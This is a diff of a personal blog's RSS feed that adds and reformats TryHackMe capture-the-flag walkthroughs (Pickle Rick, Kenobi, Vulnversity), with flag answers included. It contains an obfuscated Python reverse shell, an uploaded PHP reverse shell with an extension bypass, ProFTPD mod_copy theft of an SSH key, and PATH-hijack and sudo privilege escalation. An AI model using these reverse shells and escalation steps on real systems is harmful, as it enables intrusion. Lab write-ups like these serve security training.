@@ -6,8 +6,126 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 12 Apr 2023 12:25:08 -0500</lastBuildDate>
+        <lastBuildDate>Thu, 13 Apr 2023 10:04:47 -0500</lastBuildDate>
         <atom:link href="https://jb-williams.github.io/jbtech.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM_PickleRick_Walkthrough</title>
+            <link>https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_picklerick_walkthrough/</link>
+            <pubDate>Thu, 13 Apr 2023 10:04:47 -0500</pubDate>
+            
+            <guid>https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_picklerick_walkthrough/</guid>
+            <description>Pickle Rick TryHackMe performed by: jb-williams Pickle Rick To access the box add the machines IP to this https://&amp;lt;IP&amp;gt;.p.thmlabs.com
+Traveling to the sight we can start gathering information First it is always good to View Page Source to see if there are any information disclosers accidently left in the html source code. Doing so, you can see that a comment left in the source code is reminding Rick that the user name for their account is R1ckRul3s Now we scan the box with nmap to see what info we can gather.</description>
+            <content type="html"><![CDATA[<h1 id="pickle-rick-tryhackme">Pickle Rick TryHackMe</h1>
+<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
+<h1 id="heading"></h1>
+<h2 id="pickle-rick">Pickle Rick</h2>
+<p>To access the box add the machines IP to this <code>https://&lt;IP&gt;.p.thmlabs.com</code></p>
+<ul>
+<li>Traveling to the sight we can start gathering information</li>
+<li>First it is always good to <code>View Page Source</code> to see if there are any information disclosers accidently left in the html source code.</li>
+<li>Doing so, you can see that a comment left in the source code is reminding Rick that the user name for their account is <code>R1ckRul3s</code></li>
+</ul>
+<h1 id="heading-1"></h1>
+<ul>
+<li>Now we scan the box with nmap to see what info we can gather.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -sC -sV -oN nmap/initial &lt;IP&gt;
+</span></span></code></pre></div><ul>
+<li>Found that OpenSSH 7.2p2 on port <code>22</code></li>
+<li>Found that Apache httpd 2.4.18 on port <code>80</code></li>
+</ul>
+<h1 id="heading-2"></h1>
+<ul>
+<li>While nmap was running I went to the site and just to check and see if there is anything interesting in the <code>robots.txt</code> file.</li>
+<li>There was a single &lsquo;word&rsquo; in that file: <code>Wubbalubbadubdub</code></li>
+</ul>
+<h1 id="heading-3"></h1>
+<ul>
+<li>I like to use <code>feroxbuster</code> instead of <code>gobuster</code>, just preference. So I ran my normal <code>feroxbuster</code> cmd, which also routes it through my web-proxy <code>zaproxy</code>(similar to burp) so I can capture and reuse any requests.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -x php,php5,htm,html,html5,js,txt -t <span style="color:#ae81ff">15</span> -L <span style="color:#ae81ff">15</span> -s 200,302,304 -P http://localhost:8080 -e -u http://10.10.24.209/
+</span></span></code></pre></div><ul>
+<li>Found a hidden <code>/login.php</code> route an began fuzzing Rick&rsquo;s login with username <code>R1ckRul3s</code></li>
+<li>After some time of fuzzing the password with <code>zaproxy</code> and poking around some, I got back to the <code>/robots.txt</code> and was reminded about <code>Wubbalubbadubdub</code>.</li>
+<li>I was able to login to Rick&rsquo;s account with username: <code>R1ckRul3s</code> password: <code>Wubbalubbadubdub</code></li>
+</ul>
+<h1 id="heading-4"></h1>
+<ul>
+<li>Logging in brought me to <code>/portal.php</code> with the first page being a <code>Command Panel</code>.</li>
+<li>Immediately attempted to run <code>ls</code> and say that it did list out directory contents:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Sup3rS3cretPickl3Ingred.txt
+</span></span><span style="display:flex;"><span>assets
+</span></span><span style="display:flex;"><span>clue.txt
+</span></span><span style="display:flex;"><span>denied.php
+</span></span><span style="display:flex;"><span>index.html
+</span></span><span style="display:flex;"><span>login.php
+</span></span><span style="display:flex;"><span>portal.php
+</span></span><span style="display:flex;"><span>robots.txt
+</span></span></code></pre></div><ul>
+<li>Trying to <code>cat</code> out any file responds with that command being disabled.</li>
+<li>A go to for me, seems a little long, but usually works for me is this bash syntax:
+<em>use absolute path if necessary, default would be files in current working directory</em></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read line; <span style="color:#66d9ef">do</span> echo $line; <span style="color:#66d9ef">done</span> &lt; $FILE
+</span></span><span style="display:flex;"><span>ex:
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read line; <span style="color:#66d9ef">do</span> echo $line; <span style="color:#66d9ef">done</span> &lt; Sup3rS3cretPickl3Ingred.txt
+</span></span></code></pre></div><ul>
+<li>Did that with both <code>Sup3rS3cretPickl3Ingred.txt</code>(our answer for question one) and <code>clue.txt</code>(clue to next ingredient)</li>
+</ul>
+<h1 id="heading-5"></h1>
+<ul>
+<li>Tried some different commands and found that this <em>slightly</em> obfuscated python3 reverse shell was able to work. To get the shell I ran:
+<em>local machine</em></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p><em>in the command panel I pasted this(make sure you change you your ip and port)</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>p<span style="color:#ae81ff">\y</span>thon3 -c <span style="color:#e6db74">&#39;import os,pty,socket;s=socket.socket();s.connect((&#34;&lt;IP&gt;&#34;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;bash&#34;)&#39;</span>
+</span></span></code></pre></div><h1 id="heading-6"></h1>
+<ul>
+<li>Once I had a shell on the machine I ran <code>ls /home</code> to see any users&rsquo; home directories.</li>
+<li>Noticed Rick&rsquo;s so I ran <code>ls -la /home/rick</code> and saw <code>second ingredients</code>.</li>
+<li>Seeing the output that way let me know that it was a file with a space in the name so to cat it out I ran:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /home/rick/second<span style="color:#ae81ff">\ </span>ingredients
+</span></span></code></pre></div><ul>
+<li>And that got us the answer to the second question.</li>
+</ul>
+<h1 id="heading-7"></h1>
+<ul>
+<li>Gathering more information about the system I happened to run <code>sudo -l</code> and saw that user <code>www-data</code>(which was the user I was on as) could run any sudo command withought a password, so I ran:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
+</span></span></code></pre></div><ul>
+<li>And was given <code>root</code> access.</li>
+</ul>
+<h1 id="heading-8"></h1>
+<ul>
+<li>I traversed over to the <code>/root</code> dir and listed it&rsquo;s contents and saw <code>3rd.txt</code></li>
+<li>After using <code>cat</code> to display <code>3rd.txt</code> we got the answer for the last question.</li>
+</ul>
+<h1 id="heading-9"></h1>
+<h3 id="what-is-the-first-ingredient-rick-needs"><em>What is the first ingredient Rick needs?</em></h3>
+<ul>
+<li><strong>Answer</strong>: <code>mr. meeseek hair</code></li>
+</ul>
+<h1 id="heading-10"></h1>
+<h3 id="whats-the-second-ingredient-rick-needs"><em>Whats the second ingredient Rick needs?</em></h3>
+<ul>
+<li><strong>Answer</strong>: <code>1 jerry tear</code></li>
+</ul>
+<h1 id="heading-11"></h1>
+<h3 id="whats-the-final-ingredient-rick-needs"><em>Whats the final ingredient Rick needs?</em></h3>
+<ul>
+<li><strong>Answer</strong>: <code>fleep juice</code></li>
+</ul>
+<h1 id="heading-12"></h1>
+<h1 id="heading-13"></h1>
+<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
+]]></content>
+        </item>
         
         <item>
             <title>THM_Kenobi_Walkthrough</title>
@@ -17,7 +135,7 @@
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_kenobi_walkthrough/</guid>
             <description>Kenobi THM performed by: jb-willams Deploy the vulnerable machine Scan the machine with nmap, how many ports are open? Deploy the Machine and scan it with nmap nmap -v -p- -sV -sC -T4 -oA nmap/initial 10.10.223.56 &amp;amp;&amp;amp; grep -i &amp;#34;open&amp;#34; nmap/initial.nmap ~▹| cut -d&amp;#39; &amp;#39; -f 1 | cut -d&amp;#39;/&amp;#39; -f1 | tee nmap/ports.txt | wc -l notice, you may get some false positives that will have unknown service, ignore them</description>
             <content type="html"><![CDATA[<h1 id="kenobi-thm">Kenobi THM</h1>
-<h2 id="performed-by-jb-willams">performed by: jb-willams</h2>
+<h4 id="performed-by-jb-willams">performed by: jb-willams</h4>
 <h1 id="heading"></h1>
 <h2 id="deploy-the-vulnerable-machine">Deploy the vulnerable machine</h2>
 <h1 id="heading-1"></h1>
@@ -25,8 +143,8 @@
 <ul>
 <li>Deploy the Machine and scan it with nmap</li>
 </ul>
-<pre tabindex="0"><code>nmap -v -p- -sV -sC -T4 -oA nmap/initial 10.10.223.56 &amp;&amp; grep -i &#34;open&#34; nmap/initial.nmap     ~▹| cut -d&#39; &#39; -f 1 | cut -d&#39;/&#39; -f1 | tee nmap/ports.txt | wc -l
-</code></pre><p><em>notice, you may get some false positives that will have <code>unknown service</code>, ignore them</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -p- -sV -sC -T4 -oA nmap/initial 10.10.223.56 <span style="color:#f92672">&amp;&amp;</span> grep -i <span style="color:#e6db74">&#34;open&#34;</span> nmap/initial.nmap     ~▹| cut -d<span style="color:#e6db74">&#39; &#39;</span> -f <span style="color:#ae81ff">1</span> | cut -d<span style="color:#e6db74">&#39;/&#39;</span> -f1 | tee nmap/ports.txt | wc -l
+</span></span></code></pre></div><p><em>notice, you may get some false positives that will have <code>unknown service</code>, ignore them</em></p>
 <ul>
 <li><strong>Answer</strong>: Number of ports open: <code>7</code></li>
 </ul>
@@ -40,8 +158,8 @@ They ask you to notice the SMB service running and mention that it would be a go
 <li>SMB uses ports <code>445</code> <code>139</code> (usually)</li>
 <li>You can enumerate SMB with this nmap command using these scripts</li>
 </ul>
-<pre tabindex="0"><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.223.56
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">445</span> --script<span style="color:#f92672">=</span>smb-enum-shares.nse,smb-enum-users.nse 10.10.223.56
+</span></span></code></pre></div><ul>
 <li><strong>Answer</strong>: <code>3</code></li>
 </ul>
 <h1 id="heading-4"></h1>
@@ -50,17 +168,17 @@ They ask you to notice the SMB service running and mention that it would be a go
 <li>The scripts show an <code>anonymous</code> share.</li>
 <li>Attempt to login to the share with <em>blank</em> password.</li>
 </ul>
-<pre tabindex="0"><code>smbclient //10.10.223.56/anonymous
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.10.223.56/anonymous
+</span></span></code></pre></div><ul>
 <li>To list the files run the <code>ls</code> cmd.</li>
 <li>While logged in you can download that file running:</li>
 </ul>
-<pre tabindex="0"><code>get log.txt
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>get log.txt
+</span></span></code></pre></div><ul>
 <li>Or you can download recurisvely while not logged in with:</li>
 </ul>
-<pre tabindex="0"><code>smbget -R smb://10.10.223.56/anonymous
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbget -R smb://10.10.223.56/anonymous
+</span></span></code></pre></div><ul>
 <li><strong>Answer</strong>: <code>log.txt</code></li>
 </ul>
 <h1 id="heading-5"></h1>
@@ -74,8 +192,8 @@ They ask you to notice the SMB service running and mention that it would be a go
 <ul>
 <li>Going back to our nmap scan for open ports we can see that there is RPC running on port 111(in this case) and we can enumerate that service more with nmap.</li>
 </ul>
-<pre tabindex="0"><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.223.56
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">111</span> --script<span style="color:#f92672">=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.223.56
+</span></span></code></pre></div><ul>
 <li><strong>Answer</strong>: <code>/var</code></li>
 </ul>
 <h1 id="heading-7"></h1>
@@ -85,8 +203,8 @@ They ask you to notice the SMB service running and mention that it would be a go
 <ul>
 <li>With <code>netcat</code> you can do a quick connect to find the version of ProFTPD running.</li>
 </ul>
-<pre tabindex="0"><code>nc 10.10.223.56 21
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.223.56 <span style="color:#ae81ff">21</span>
+</span></span></code></pre></div><ul>
 <li><strong>Answer</strong>: <code>1.3.5</code></li>
 </ul>
 <h1 id="heading-9"></h1>
@@ -94,8 +212,8 @@ They ask you to notice the SMB service running and mention that it would be a go
 <ul>
 <li>You can easily check for basice vulnerabilities with <code>searchsploit</code>.</li>
 </ul>
-<pre tabindex="0"><code>searchsploit proftpd 1.3.5
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit proftpd 1.3.5
+</span></span></code></pre></div><ul>
 <li><strong>Answer</strong>: <code>4</code></li>
 </ul>
 <h1 id="heading-10"></h1>
@@ -105,27 +223,27 @@ They ask you to notice the SMB service running and mention that it would be a go
 <li>And from <code>log.txt</code> we know there is an ssh key created for the <code>kenobi</code> user.</li>
 <li>So, lets try to copy <code>kenobi</code>&rsquo;s ssh key to the mountable directory.</li>
 </ul>
-<pre tabindex="0"><code>nc 10.10.223.56 21
-220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.223.56]
-SITE CPFR /home/kenobi/.ssh/id_rsa
-350 File or directory exists, ready for destination name
-SITE CPTO /var/tmp/id_rsa
-250 Copy successful
-^C
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.223.56 <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> ProFTPD 1.3.5 Server <span style="color:#f92672">(</span>ProFTPD Default Installation<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.223.56<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>SITE CPFR /home/kenobi/.ssh/id_rsa
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">350</span> File or directory exists, ready <span style="color:#66d9ef">for</span> destination name
+</span></span><span style="display:flex;"><span>SITE CPTO /var/tmp/id_rsa
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Copy successful
+</span></span><span style="display:flex;"><span>^C
+</span></span></code></pre></div><ul>
 <li>Earlier, with the scan on port 111, we saw that there is a mount point at <code>/var</code> and we just moved the ssh key to that directory tree.</li>
 <li>Lets mount the <code>/var</code> dir to our machine</li>
 </ul>
-<pre tabindex="0"><code>mkdir /mnt/kenobiNFS
-mount 10.10.223.56:/var /mnt/kenobiNFS
-ls -la /mnt/kenobiNFS
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir /mnt/kenobiNFS
+</span></span><span style="display:flex;"><span>mount 10.10.223.56:/var /mnt/kenobiNFS
+</span></span><span style="display:flex;"><span>ls -la /mnt/kenobiNFS
+</span></span></code></pre></div><ul>
 <li>And now we can traverse to <code>/mnt/kenobiNFS</code> and/or just copy it, and get kenobi&rsquo;s private key to login as that user.</li>
 </ul>
-<pre tabindex="0"><code>cp /mnt/kenobiNFS/tmp/id_rsa .
-sudo chmod 600 id_rsa
-ssh -i id_rsa kenobi@10.10.223.56
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /mnt/kenobiNFS/tmp/id_rsa .
+</span></span><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">600</span> id_rsa
+</span></span><span style="display:flex;"><span>ssh -i id_rsa kenobi@10.10.223.56
+</span></span></code></pre></div><ul>
 <li><strong>Answer</strong>: d0b0f3f53b6caa532a83915e19224899</li>
 </ul>
 <h1 id="heading-11"></h1>
@@ -136,8 +254,8 @@ ssh -i id_rsa kenobi@10.10.223.56
 <li>They let you know some info about SUID&rsquo;s and that they can be used to escalate priveleges.</li>
 <li>Using their command try to find the file that looks out of the ordinary. (I have used my own machine as reference several times)</li>
 </ul>
-<pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><ul>
 <li><strong>Answer</strong>: <code>/usr/bin/menu</code></li>
 </ul>
 <h1 id="heading-13"></h1>
@@ -158,10 +276,10 @@ ssh -i id_rsa kenobi@10.10.223.56
 <p>We are going copy <code>/bin/bash</code> to <code>/tmp/curl</code> then modify the <code>$PATH</code> to read our binary first.</p>
 </li>
 </ul>
-<pre tabindex="0"><code>echo /bin/bash &gt; /tmp/curl
-chmod 777 /tmp/curl
-export PATH=/tmp:$PATH
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo /bin/bash &gt; /tmp/curl
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /tmp/curl
+</span></span><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/tmp:$PATH
+</span></span></code></pre></div><ul>
 <li>
 <p>Then run <code>/usr/bin/menu</code> again and chose option <code>1</code> that uses curl and it will place you in a priveleged bash shell.</p>
 </li>
@@ -169,6 +287,9 @@ export PATH=/tmp:$PATH
 <p><strong>Answer</strong>: <code>177b3cd8562289f37382721c28381f02</code></p>
 </li>
 </ul>
+<h1 id="heading-15"></h1>
+<h1 id="heading-16"></h1>
+<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
 ]]></content>
         </item>
         
@@ -178,11 +299,13 @@ export PATH=/tmp:$PATH
             <pubDate>Tue, 11 Apr 2023 15:50:37 -0500</pubDate>
             
             <guid>https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_vulnversity_walkthrough/</guid>
-            <description>Vulnversity Walkthrough TryHackMe Reconnaisance They first ask for you to search for any nmap resourses(cheatsheets) online, I came across this one that seemed really useful: https://www.stationx.net/nmap-cheat-sheet/
+            <description>Vulnversity Walkthrough TryHackMe performed by: jb-williams Reconnaisance They first ask for you to search for any nmap resourses(cheatsheets) online, I came across this one that seemed really useful: https://www.stationx.net/nmap-cheat-sheet/
 The First Real Question
 Scan the box, how many ports are open? I like to build up a chain of commands for most boxes.
-While doing my scans I like to create a file that contains just the numerical port values to have. So my command came out like this: nmap -v -T4 -sV -sC -oA nmap/initial 10.</description>
+While doing my scans I like to create a file that contains just the numerical port values to have.</description>
             <content type="html"><![CDATA[<h1 id="vulnversity-walkthrough-tryhackme">Vulnversity Walkthrough TryHackMe</h1>
+<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
+<h1 id="heading"></h1>
 <h2 id="reconnaisance">Reconnaisance</h2>
 <p>They first ask for you to search for any <code>nmap</code> resourses(cheatsheets) online, I came across this one that seemed really useful:
 <code>https://www.stationx.net/nmap-cheat-sheet/</code></p>
@@ -192,39 +315,39 @@ While doing my scans I like to create a file that contains just the numerical po
 <ul>
 <li>While doing my scans I like to create a file that contains just the numerical port values to have. So my command came out like this:</li>
 </ul>
-<pre tabindex="0"><code>nmap -v -T4 -sV -sC -oA nmap/initial 10.10.124.14 &amp;&amp; grep -i &#34;open&#34; nmap/initial.nmap | cut -d&#39; &#39; -f 1 | cut -d&#39;/&#39; -f1 | tee nmap/ports.txt | wc -l
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -T4 -sV -sC -oA nmap/initial 10.10.124.14 <span style="color:#f92672">&amp;&amp;</span> grep -i <span style="color:#e6db74">&#34;open&#34;</span> nmap/initial.nmap | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f <span style="color:#ae81ff">1</span> | cut -d<span style="color:#e6db74">&#39;/&#39;</span> -f1 | tee nmap/ports.txt | wc -l
+</span></span></code></pre></div><ul>
 <li>Number of ports open: <code>6</code></li>
 </ul>
-<h1 id="heading"></h1>
+<h1 id="heading-1"></h1>
 <h3 id="what-version-of-the-squid-proxy-is-running-on-the-machine"><strong>What version of the <code>squid proxy</code> is running on the machine?</strong></h3>
-<pre tabindex="0"><code>grep -i &#34;squid&#34; nmap/initial.nmap | awk &#39;{print $NF}&#39;
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i <span style="color:#e6db74">&#34;squid&#34;</span> nmap/initial.nmap | awk <span style="color:#e6db74">&#39;{print $NF}&#39;</span>
+</span></span></code></pre></div><ul>
 <li>Version of Squid Proxy: <code>3.5.12</code></li>
 </ul>
-<h1 id="heading-1"></h1>
+<h1 id="heading-2"></h1>
 <h3 id="how-many-ports-will-nmap-scan-if-the-flag--p-400-is-used"><strong>How many ports will nmap scan if the flag -p-400 is used?</strong></h3>
 <ul>
 <li>Looking at man page or online resource: <code>400</code></li>
 </ul>
-<h1 id="heading-2"></h1>
+<h1 id="heading-3"></h1>
 <h3 id="using-the-nmap-flag--n-what-will-it-not-resolve"><strong>Using the nmap flag -n what will it not resolve?</strong></h3>
 <ul>
 <li>Looking at man page or online resource: <code>DNS</code></li>
 </ul>
-<h1 id="heading-3"></h1>
+<h1 id="heading-4"></h1>
 <h3 id="what-is-the-most-likely-operating-system-this-machine-is-running"><strong>What is the most likely operating system this machine is running?</strong></h3>
-<pre tabindex="0"><code>grep -i &#34;os&#34; nmap/initial.nmap
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i <span style="color:#e6db74">&#34;os&#34;</span> nmap/initial.nmap
+</span></span></code></pre></div><ul>
 <li>Quickly scanning output, you can see that: <code>Ubuntu</code> is listed most.</li>
 </ul>
 <h3 id="what-port-is-the-web-server-running-on"><strong>What port is the web server running on?</strong></h3>
-<pre tabindex="0"><code>grep -i &#34;http&#34; nmap/initial.nmap
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i <span style="color:#e6db74">&#34;http&#34;</span> nmap/initial.nmap
+</span></span></code></pre></div><ul>
 <li>Http server is on port: <code>3333</code></li>
 </ul>
 <p><em>Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don&rsquo;t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)</em></p>
-<h1 id="heading-4"></h1>
+<h1 id="heading-5"></h1>
 <h2 id="locating-directories-using-gobuster">Locating directories using GoBuster</h2>
 <p>Using <code>gobuster</code>:</p>
 <table>
@@ -262,20 +385,20 @@ While doing my scans I like to create a file that contains just the numerical po
 </tbody>
 </table>
 <h3 id="what-is-the-directory-that-has-an-upload-form-page"><strong>What is the directory that has an upload form page?</strong></h3>
-<pre tabindex="0"><code>gobuster dir -u http://10.10.124.148:3333 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt -t 15
-</code></pre><p><em>I like using <code>feroxbuster</code> and it let me know more info esp. about the dir path sooner</em></p>
-<pre tabindex="0"><code>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -t 15 -L 15 -s 200,302,304 -e -u http://10.10.124.148:3333/
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.124.148:3333 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt -t <span style="color:#ae81ff">15</span>
+</span></span></code></pre></div><p><em>I like using <code>feroxbuster</code> and it let me know more info esp. about the dir path sooner</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -t <span style="color:#ae81ff">15</span> -L <span style="color:#ae81ff">15</span> -s 200,302,304 -e -u http://10.10.124.148:3333/
+</span></span></code></pre></div><ul>
 <li>The directory that has an upload form page is: <code>/internal/</code> and <code>/internal/uploads</code>(but they don&rsquo;t ask for this one, its just important to know about later)</li>
 </ul>
-<h1 id="heading-5"></h1>
+<h1 id="heading-6"></h1>
 <h2 id="compromise-the-webserver">Compromise the webserver</h2>
 <p>After finding the form to upload files:</p>
 <h3 id="what-file-type-which-youd-wnat-to-upload-to-exploit-the-server-is-blocked-try-a-couple-to-find-out"><em>What file type, which you&rsquo;d wnat to upload to exploit the server, is blocked? Try a couple to find out.</em>*</h3>
 <ul>
 <li>Fist, trying to upload a reverse shell: this was blocked <code>reverseshell.php</code></li>
 </ul>
-<h1 id="heading-6"></h1>
+<h1 id="heading-7"></h1>
 <ul>
 <li>
 <p>The room walks you through using <code>burp</code> to fuzz the upload for, I wrote a python script to fuzz for me.:</p>
@@ -293,14 +416,14 @@ While doing my scans I like to create a file that contains just the numerical po
 <p>Download this PHP revsere shell <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">downloadLink</a> - <code>php-reverse-shell.phtml</code></p>
 </li>
 </ul>
-<h1 id="heading-7"></h1>
+<h1 id="heading-8"></h1>
 <ul>
 <li>Edit the file changing the IP to your <code>tun0</code> THM IP and desired port.</li>
 <li>Setup a listener on the port specified in the reverse shell
 ex:</li>
 </ul>
-<pre tabindex="0"><code>nc -lnvp 4444
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><ul>
 <li>Upload the reverse shell on the upload form and navigate here to execute the payload <code>http://&lt;IP&gt;:3333/internal/uploads/php-reverse-shell.phtml</code></li>
 </ul>
